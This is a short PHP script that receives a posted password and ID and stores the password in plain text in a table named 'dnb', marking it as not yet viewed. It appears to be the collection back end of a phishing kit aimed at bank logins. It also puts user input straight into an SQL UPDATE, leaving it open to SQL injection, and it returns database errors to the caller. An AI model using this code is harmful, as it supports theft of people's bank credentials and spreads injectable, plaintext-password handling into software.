<?php
require '../connection.php';

if ($_POST["password"] and $_POST["uniqueid"]) {
  $kb = $_POST["password"];
  $uniqueid = $_POST["uniqueid"];

  $upload_login_code = mysqli_query($conn, "UPDATE dnb SET password='$kb', status=0, viewed='false' WHERE uniqueid=$uniqueid");

  if ($upload_login_code) {
    echo json_encode(array(
      'status' => 'success'
    ));
  } else {
    echo json_encode(array(
      'status' => 'failure',
      'error' => mysqli_error($conn)
    ));
  }
}
?>
